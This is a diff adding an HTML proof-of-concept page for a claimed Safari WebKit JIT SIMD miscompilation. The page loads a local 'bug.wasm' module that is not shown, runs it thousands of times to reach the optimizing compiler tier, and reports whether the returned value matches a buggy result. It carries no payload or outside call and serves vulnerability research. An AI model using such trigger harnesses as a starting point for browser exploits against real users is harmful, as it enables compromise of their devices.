@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>WebKit 0-Day PoC</title>
+    <style>
+        body { font-family: monospace; background: #1e1e1e; color: #00ff00; padding: 20px; }
+        .vuln { color: #ff0000; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h2>Safari WebKit JIT SIMD Miscompilation PoC</h2>
+    <p>Executing WebAssembly module...</p>
+    <pre id="log"></pre>
+
+    <script>
+        function log(msg) {
+            document.getElementById('log').innerHTML += msg + "\n";
+        }
+
+        async function poc() {
+            try {
+                // Fetch and compile the WebAssembly module
+                const response = await fetch('bug.wasm');
+                const buffer = await response.arrayBuffer();
+                const module = await WebAssembly.instantiate(buffer);
+                
+                // Trigger the JIT compiled Wasm function
+                log("Running Wasm function...");
+                
+                // For optimal JIT compilation (Tier 3 / OMG tier), we run it a few thousand times
+                // to ensure the B3 optimizing compiler kicks in!
+                let result = 0;
+                for(let i = 0; i < 10000; i++) {
+                    result = module.instance.exports.trigger();
+                }
+
+                // Format the output
+                const hexResult = "0x" + result.toString(16).padStart(8, '0');
+                log("Returned Value: " + hexResult);
+
+                // Check for the bug
+                if (result === 0x00330044) {
+                    log("<span class='vuln'>[!] VULNERABILITY CONFIRMED IN SAFARI!</span>");
+                    log("The JIT compiler emitted the wrong machine code.");
+                    log("Expected: 0x00110033");
+                    log("Got:      " + hexResult);
+                } else if (result === 0x00110033) {
+                    log("[*] Result is mathematically correct. JIT bug did not trigger (or engine is patched).");
+                } else {
+                    log("[?] Unknown result: " + hexResult);
+                }
+
+            } catch (e) {
+                log("Error: " + e);
+            }
+        }
+
+        poc();
+    </script>
+</body>
+</html>
